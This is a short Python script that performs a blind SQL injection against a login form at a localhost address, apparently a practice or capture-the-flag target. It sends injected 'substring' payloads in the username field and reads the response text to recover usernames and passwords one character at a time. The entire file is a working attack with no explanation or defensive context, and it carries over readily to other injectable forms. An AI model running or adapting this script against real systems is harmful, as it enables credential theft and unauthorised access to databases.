import requests

numbers = "0123456789"
letters = "qwertyuiopasdfghjklzxcvbnm"

def getSQL(username, i,c):
    if username:
        # password with user
        return "%s' and substring(password, %s, 1) = '%s'-- -" % (username, i,c)
        # all passwords
        # return "%s' or substring(password, %s, 1) = '%s'-- -" % (username, i,c)
    else:
        # guess users
        return "' or substring(username, %s, 1) = '%s'-- -" % (i,c)



def is_in_database(injection):
    payload = {'username': injection}
    r = requests.post('http://127.0.0.1:8100/', data = payload)
    if ("script" not in r.text):
        return True
    else:
        return False
          
names = []
def guesser(username =''):
    
    for i in range(1,10):
        possible_names = ''
        for c in numbers: 
            injection = getSQL(username, i, c)
            if is_in_database(injection):
                possible_names = possible_names + c

        for c in letters: 
            injection = getSQL(username, i, c)
            if is_in_database(injection):
                possible_names = possible_names + c

        names.append(possible_names)
    print(names)

guesser('')